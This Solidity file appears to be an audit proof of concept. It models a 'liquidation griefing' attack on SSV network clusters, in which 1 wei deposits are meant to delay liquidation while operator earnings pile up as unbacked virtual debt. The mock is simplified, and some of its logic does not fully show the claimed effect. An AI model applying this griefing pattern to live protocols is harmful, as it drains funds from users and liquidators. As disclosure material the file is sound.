// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SSV Liquidation Griefing PoC
 * @dev This contract demonstrates liquidation griefing:
 * 1. Find liquidatable cluster (below threshold)
 * 2. Grief liquidators with 1 wei deposit
 * 3. Extend exploitation window
 * 4. Maximize virtual debt accumulation
 */
contract MockLiquidationGriefing {
    struct Snapshot {
        uint64 block;
        uint256 balance;
    }

    struct Operator {
        uint256 fee;
        Snapshot snapshot;
    }

    struct Cluster {
        uint256 balance;
        uint256 validatorCount;
        bool liquidatable;
    }

    mapping(uint64 => Operator) public operators;
    mapping(bytes32 => Cluster) public clusters;
    uint256 public totalContractAssets;
    uint256 public constant LIQUIDATION_THRESHOLD = 0.1e18; // 0.1 SSV

    event GriefingAttack(bytes32 indexed clusterId, uint256 griefingAmount, uint256 timestamp);
    event ExtendedExploitation(bytes32 indexed clusterId, uint256 blocksExtended, uint256 virtualDebtAccumulated);

    // --- Core Protocol Logic ---

    function deposit(bytes32 clusterId, uint256 amount) external {
        clusters[clusterId].balance += amount;
        totalContractAssets += amount;
        
        // Check if this is a griefing attack (1 wei deposit on liquidatable cluster)
        if (amount == 1 && clusters[clusterId].liquidatable) {
            emit GriefingAttack(clusterId, amount, block.timestamp);
        }
    }

    /**
     * Griefing attack: Front-run liquidation with minimal deposit
     */
    function griefLiquidation(bytes32 clusterId) external {
        require(clusters[clusterId].liquidatable, "Cluster not liquidatable");
        require(clusters[clusterId].balance < LIQUIDATION_THRESHOLD, "Above threshold");
        
        // Deposit 1 wei to keep cluster active
        clusters[clusterId].balance += 1;
        totalContractAssets += 1;
        
        // Cluster remains active but still effectively insolvent
        emit GriefingAttack(clusterId, 1, block.timestamp);
    }

    /**
     * Replicates OperatorLib.updateSnapshotSt logic
     */
    function updateOperatorSnapshot(uint64 operatorId, uint32 currentBlock) public {
        Operator storage op = operators[operatorId];
        uint256 blockDiff = currentBlock - op.snapshot.block;
        
        // Calculate earnings from ALL clusters including "griefed" ones
        uint256 totalValidators = getTotalValidatorsForOperator(operatorId);
        uint256 earnings = blockDiff * op.fee * totalValidators;
        
        op.snapshot.balance += earnings; // Unconditional increment
        op.snapshot.block = currentBlock;
    }

    /**
     * Replicates ClusterLib.updateBalance logic
     * CAPPED at zero
     */
    function updateClusterBalance(bytes32 clusterId, uint64 operatorId, uint32 currentBlock) public {
        Cluster storage clus = clusters[clusterId];
        Operator storage op = operators[operatorId];
        
        uint256 blockDiff = currentBlock - op.snapshot.block;
        uint256 usage = blockDiff * op.fee * clus.validatorCount;

        uint256 oldBalance = clus.balance;
        clus.balance = usage > clus.balance ? 0 : clus.balance - usage;
        
        // Mark as liquidatable if balance is critically low
        if (clus.balance < LIQUIDATION_THRESHOLD && clus.balance > 0) {
            clus.liquidatable = true;
        }
    }

    function withdrawOperatorEarnings(uint64 operatorId, uint256 amount) external {
        require(operators[operatorId].snapshot.balance >= amount, "Insufficient virtual balance");
        require(totalContractAssets >= amount, "PROTOCOL INSOLVENT: Contract Empty!");
        
        operators[operatorId].snapshot.balance -= amount;
        totalContractAssets -= amount;
    }

    function setOperator(uint64 id, uint256 fee, uint32 startBlock) external {
        operators[id].fee = fee;
        operators[id].snapshot.block = startBlock;
    }

    function setCluster(bytes32 id, uint256 balance, uint256 validators) external {
        clusters[id].balance = balance;
        clusters[id].validatorCount = validators;
        clusters[id].liquidatable = balance < LIQUIDATION_THRESHOLD;
    }

    function getTotalValidatorsForOperator(uint64 operatorId) public pure returns (uint256) {
        return 10; // Placeholder
    }

    /**
     * Calculate accumulated virtual debt during griefing period
     */
    function calculateGriefingDebt(
        bytes32 clusterId, 
        uint64 operatorId, 
        uint256 blocksDelayed
    ) external view returns (uint256) {
        Operator storage op = operators[operatorId];
        Cluster storage clus = clusters[clusterId];
        
        // Virtual debt accumulated during griefing period
        return blocksDelayed * op.fee * clus.validatorCount;
    }

    /**
     * Liquidate a cluster (would be called by liquidator)
     */
    function liquidate(bytes32 clusterId) external {
        Cluster storage clus = clusters[clusterId];
        require(clus.balance < LIQUIDATION_THRESHOLD, "Not liquidatable");
        require(clus.balance > 0, "Already liquidated");
        
        // In real protocol, this would remove cluster
        clus.balance = 0;
        clus.liquidatable = false;
    }
}
